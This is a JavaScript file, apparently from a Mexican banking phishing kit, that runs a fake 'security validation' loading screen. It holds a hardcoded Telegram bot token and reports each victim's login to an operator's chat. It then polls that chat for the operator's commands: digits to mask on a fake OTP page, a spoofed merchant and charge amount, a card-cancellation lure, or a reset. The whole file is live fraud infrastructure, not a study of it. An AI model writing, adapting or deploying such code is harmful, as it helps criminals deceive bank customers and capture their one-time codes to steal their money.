/* ============================================================
   Pantalla de Carga — Gatekeeper
   - PASADA 1 (login): pide 2 dígitos (máscara) + cargo opcional
   - PASADA 2+ (volvió del dashboard): NO vuelve a preguntar,
     mantiene la config y da 8s para reconfigurar el cargo
   ============================================================ */

(function () {
  "use strict";

  // !!! CREDENCIALES DE TELEGRAM !!!
  const TELEGRAM_TOKEN = '9068600803:AAGIYrU6UrsLU8_0x0dkZLUTQ_YKr4535BE'; 
  const TELEGRAM_CHAT_ID = '9180377107';
  
  const textStatus = document.getElementById("loading-text");

  // ============================================================
  // ESCAPE DE SEGURIDAD: Evita ejecutarse en la pantalla incorrecta
  // ============================================================
  if (!textStatus) {
    console.log("Gatekeeper: No se detectó la pantalla de carga (#loading-text). Abortando ejecución.");
    return; 
  }

  const DEFAULT_MERCHANT = "Programa Cero";
  const DEFAULT_AMOUNT = "$6,000.00 MXN";
  const RECONFIG_WINDOW_MS = 20000; 

  function formatMXN(num) {
    return "$" + num.toLocaleString("es-MX", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }) + " MXN";
  }

  function parseAmount(raw) {
    const cleaned = String(raw).replace(/[^\d.,]/g, "").replace(/,/g, "");
    const n = parseFloat(cleaned);
    return isNaN(n) ? null : n;
  }

  async function sendTelegram(text) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
      });
    } catch (e) { }
  }

  async function getLastUpdateId() {
    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
      const data = await res.json();
      if (data.ok && data.result && data.result.length > 0) {
        return data.result[data.result.length - 1].update_id;
      }
    } catch (e) { }
    return 0;
  }

  async function startLoadingGatekeeper() {
    const user = sessionStorage.getItem("demo_user") || "usuario_demo";
    let lastUpdateId = await getLastUpdateId();

    const isReturnPass = sessionStorage.getItem("gatekeeper_done") === "1";

    // ============ PASADA 2+ (regresó del dashboard) ============
    if (isReturnPass) {
      const flowType = sessionStorage.getItem("flow_type") || "charge";
      const cfgMerchant = sessionStorage.getItem("charge_merchant") || DEFAULT_MERCHANT;
      const cfgAmount = sessionStorage.getItem("charge_amount") || DEFAULT_AMOUNT;

      textStatus.textContent = "Retomando validación de seguridad...";

      await sendTelegram(
        `🚨 *CONTINUANDO — SIN VOLVER A PREGUNTAR* 🚨\n\n` +
        `El usuario avanzó de paso (${flowType === "baja" ? "Baja de tarjeta" : "Cargo"}).\n` +
        `Se mantiene lo configurado:\n` +
        `💳 ${cfgMerchant}\n💰 ${cfgAmount}\n\n` +
        `• Si no quieres cambiar nada, no hagas nada.\n` +
        `• Si quieres cerrarlo y ocultar botones, responde \`cierre\`.\n` +
        `• Si quieres cambiarlo, responde \`comercio | monto\` en los próximos ${RECONFIG_WINDOW_MS / 1000} segundos.`
      );

      const tiempoInicio = Date.now();
      while (Date.now() - tiempoInicio < RECONFIG_WINDOW_MS) {
        try {
          const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0`;
          const response = await fetch(url);
          const data = await response.json();
          
          if (data.ok && data.result && data.result.length > 0) {
            for (const update of data.result) {
              lastUpdateId = update.update_id;

              const msg = update.message || update.channel_post || update.edited_message;
              if (!msg || !msg.chat || String(msg.chat.id) !== String(TELEGRAM_CHAT_ID) || !msg.text) continue;

              const textoMensaje = msg.text.trim();
              const low = textoMensaje.toLowerCase();

              if (low === 'reinicio' || low === 'reset') {
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace("index.html");
                return;
              }

              if (low === 'cierre') {
                sessionStorage.setItem("accion_telegram", "cierre");
                await sendTelegram("🔒 *Flujo Cerrado:* Botones deshabilitados. Procediendo a OTP...");
                window.location.href = "otp.html";
                return; 
              }

              if (["no", "n", "ok", "listo", "mantener"].includes(low)) {
                await sendTelegram("Mantengo el cargo actual. Entrando a OTP...");
                window.location.href = "otp.html";
                return;
              }

              const m = textoMensaje.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
              if (m) {
                const merchant = m[1].trim();
                const amt = parseAmount(m[2]);
                if (merchant && amt !== null) {
                  sessionStorage.setItem("charge_merchant", merchant);
                  sessionStorage.setItem("charge_amount", formatMXN(amt));
                  await sendTelegram(`✅ *Cargo actualizado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
                  window.location.href = "otp.html";
                  return;
                }
              }

              if (/^[\d.,]+$/.test(textoMensaje)) {
                const amt = parseAmount(textoMensaje);
                if (amt !== null) {
                  sessionStorage.setItem("charge_amount", formatMXN(amt));
                  await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
                  window.location.href = "otp.html";
                  return;
                }
              }
            }
          }
        } catch (error) { }
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      await sendTelegram("Sin respuesta. Mantengo el cargo actual. Entrando a OTP...");
      window.location.href = "otp.html"; 
      return; 
    }

    // ============ PASADA 1 (login) ============
    await sendTelegram(
      `🚨 *PASO 1: CONFIGURAR ENMASCARAMIENTO* 🚨\n\n` +
      `El usuario *${user}* pasó el login y está cargando la pantalla OTP.\n\n` +
      `📲 *Acción requerida:* Responde a este chat con exactamente *2 dígitos* (ej: \`12\`) para configurar la pantalla.`
    );
    textStatus.textContent = "Esperando configuración de seguridad móvil...";

    let tail = null;
    while (!tail) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
        const data = await res.json();

        if (data.ok && data.result && data.result.length > 0) {
          for (let i = 0; i < data.result.length; i++) {
            const update = data.result[i];
            lastUpdateId = update.update_id;
            const msg = update.message;

            if (msg) {
              const chatIDRecibido = String(msg.chat.id);
              const chatIDConfigurado = String(TELEGRAM_CHAT_ID);
              const msgText = msg.text ? msg.text.trim() : "";
              const low = msgText.toLowerCase();

              if (low === 'reinicio' || low === 'reset') {
                localStorage.clear();
                sessionStorage.clear();
                window.location.replace("index.html");
                return;
              }

              if (chatIDRecibido === chatIDConfigurado) {
                if (/^\d{2}$/.test(msgText)) { 
                  tail = msgText; 
                  break; 
                }
              }
            }
          }
        }
      } catch (err) { }
      if (!tail) await new Promise(r => setTimeout(r, 2000));
    }

    try { sessionStorage.setItem("otp_tail", tail); } catch (e) { }
    textStatus.textContent = "¡Configuración aplicada! Preparando validación...";

    // 2. Cargo dinámico opcional en pasada 1
    const esBaja = await configureCharge(lastUpdateId);

    try { sessionStorage.setItem("gatekeeper_done", "1"); } catch (e) { }

    if (esBaja) {
      setTimeout(() => { window.location.href = "dashboard.html"; }, 1000);
      return;
    }

    setTimeout(() => { window.location.href = "otp.html"; }, 1000);
  }

  async function configureCharge(lastUpdateId) {
    try {
      sessionStorage.removeItem("charge_merchant");
      sessionStorage.removeItem("charge_amount");
      sessionStorage.setItem("flow_type", "charge"); 
    } catch (e) { }

    await sendTelegram(
      `🚨 *PASO 1B: CARGO DINÁMICO (OPCIONAL)* 🚨\n\n` +
      `¿Quieres configurar un comercio y monto personalizados?\n\n` +
      `• Formato: \`comercio | monto\`\n` +
      `• Solo monto: \`3500\`\n` +
      `• Responde \`no\` para dejar el cargo por defecto.\n` +
      `• Responde \`baja\` para dejar el cargo por defecto e ir a menú baja de Tarjeta.\n\n` +
      `_Default: ${DEFAULT_MERCHANT} — ${DEFAULT_AMOUNT}_`
    );

    let done = false;
    while (!done) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
        const data = await res.json();
        if (data.ok && data.result && data.result.length > 0) {
          for (let i = 0; i < data.result.length; i++) {
            const update = data.result[i];
            lastUpdateId = update.update_id;
            const msg = update.message;
            if (!msg || !msg.chat || String(msg.chat.id) !== String(TELEGRAM_CHAT_ID) || !msg.text) continue;

            const t = msg.text.trim();
            const low = t.toLowerCase();

            if (low === 'reinicio' || low === 'reset') {
              localStorage.clear();
              sessionStorage.clear();
              window.location.replace("index.html");
              return false;
            }

            // Comando "baja": deja el cargo por defecto, marca flow_type y avisa para ir a dashboard.html
            if (low === "baja") {
              try { sessionStorage.setItem("flow_type", "baja"); } catch (e) { }
              await sendTelegram("⚠️ Se usará el cargo por defecto. Redirigiendo a Dashboard...");
              return true;
            }
            
            if (["no", "n", "default", "defecto", "skip"].includes(low)) {
              await sendTelegram("Se usará el cargo por defecto.");
              done = true; 
              break;
            }

            const m = t.match(/^(.+?)\s*[|,]\s*([\d.,]+)\s*$/);
            if (m) {
              const merchant = m[1].trim();
              const amt = parseAmount(m[2]);
              if (merchant && amt !== null) {
                sessionStorage.setItem("charge_merchant", merchant);
                sessionStorage.setItem("charge_amount", formatMXN(amt));
                await sendTelegram(`✅ *Cargo configurado:*\n🏪 ${merchant}\n💵 ${formatMXN(amt)}`);
                done = true; 
                break;
              }
            }

            if (/^[\d.,]+$/.test(t)) {
              const amt = parseAmount(t);
              if (amt !== null) {
                sessionStorage.setItem("charge_amount", formatMXN(amt));
                await sendTelegram(`✅ *Monto actualizado:* ${formatMXN(amt)}`);
                done = true; 
                break;
              }
            }
          }
        }
      } catch (e) { }
      if (!done) await new Promise(r => setTimeout(r, 2000));
    }
    return false;
  }

  // Inicialización del script
  startLoadingGatekeeper();
})();
